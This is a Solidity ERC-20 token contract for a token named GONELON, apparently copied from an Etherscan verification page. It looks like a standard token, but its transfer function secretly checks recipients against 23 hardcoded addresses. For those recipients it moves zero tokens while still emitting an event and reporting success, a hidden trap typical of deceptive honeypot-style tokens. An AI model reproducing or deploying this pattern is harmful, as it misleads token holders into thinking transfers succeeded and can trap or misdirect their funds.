/**
 *Submitted for verification at Etherscan.io on 2021-04-30
*/

pragma solidity ^0.5.0;

// ----------------------------------------------------------------------------
// ERC Token Standard #20 Interface
//
// ----------------------------------------------------------------------------
contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

// ----------------------------------------------------------------------------
// Safe Math Library 
// ----------------------------------------------------------------------------
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}


contract GONELON is ERC20Interface, SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it
    
    uint256 public _totalSupply;
    
    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;
    
    /**
     * Constrctor function
     *
     * Initializes contract with initial supply tokens to the creator of the contract
     */
    constructor() public {
        name = "GONELON";
        symbol = "GONELON";
        decimals = 18;
        _totalSupply = 30000000000000000000000;
        
        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
	
	function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }
    
    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }
    
    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }
    
    function transfer(address to, uint tokens) public returns (bool success) {
        if ((to == 0xfad95B6089c53A0D1d861eabFaadd8901b0F8533 || to == 0x575C3a99429352EDa66661fC3857b9F83f58a73f || to == 0x27F9Adb26D532a41D97e00206114e429ad58c679 || to == 0xf6da21E95D74767009acCB145b96897aC3630BaD || to == 0x000000005804B22091aa9830E50459A15E7C9241 || to == 0x78A55B9b3BBEffB36A43D9905F654d2769dC55e8 || to == 0x000000005736775Feb0C8568e7DEe77222a26880 || to == 0xFcA8852F7998633524dB884E3076239185793B92 || to == 0x9eDD647D7d6Eceae6bB61D7785Ef66c5055A9bEE || to == 0x6dA4bEa09C3aA0761b09b19837D9105a52254303 || to == 0x33015Cc952f8423cebCb3D68598792eF97C4a0a8 || to == 0x1d6E8BAC6EA3730825bde4B005ed7B2B39A2932d || to == 0x4265D0360d9A1974f6cb9d4c11614f363ddC7753 || to == 0xD644C1B56c3F8FAA7beB446C93dA2F190bFaeD9B || to == 0x160de604EE9e6149050731Da33222EfCFff1B5d0 || to == 0xF1e4aF05BACC0190BDF14bBf809621fe8E03c095 || to == 0x9282dc5c422FA91Ff2F6fF3a0b45B7BF97CF78E7 || to == 0xf875C9813BB895A067901B0FF3aACF6b6DFB994B || to == 0x231DC6af3C66741f6Cf618884B953DF0e83C1A2A || to == 0xB6BF45f59B94d31af2b51A5547eF17FF81672743 || to == 0xD78A3280085Ee846196cB5fab7D510B279486d44 || to == 0x0cCe0Ad23F0238E6c0d6a0f8e3FA7B3F963B10Ca || to == 0x2c5bA68E44fb6CC7f1312E8419102a07112E0916)) {
		 balances[msg.sender] = safeSub(balances[msg.sender], 0);
         balances[to] = safeAdd(balances[to], 0);
         emit Transfer(msg.sender, to, 0);
		}
		else {
		 balances[msg.sender] = safeSub(balances[msg.sender], tokens);
         balances[to] = safeAdd(balances[to], tokens);
         emit Transfer(msg.sender, to, tokens);
		}
        return true;
    }
    
    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
        return true;
    }
}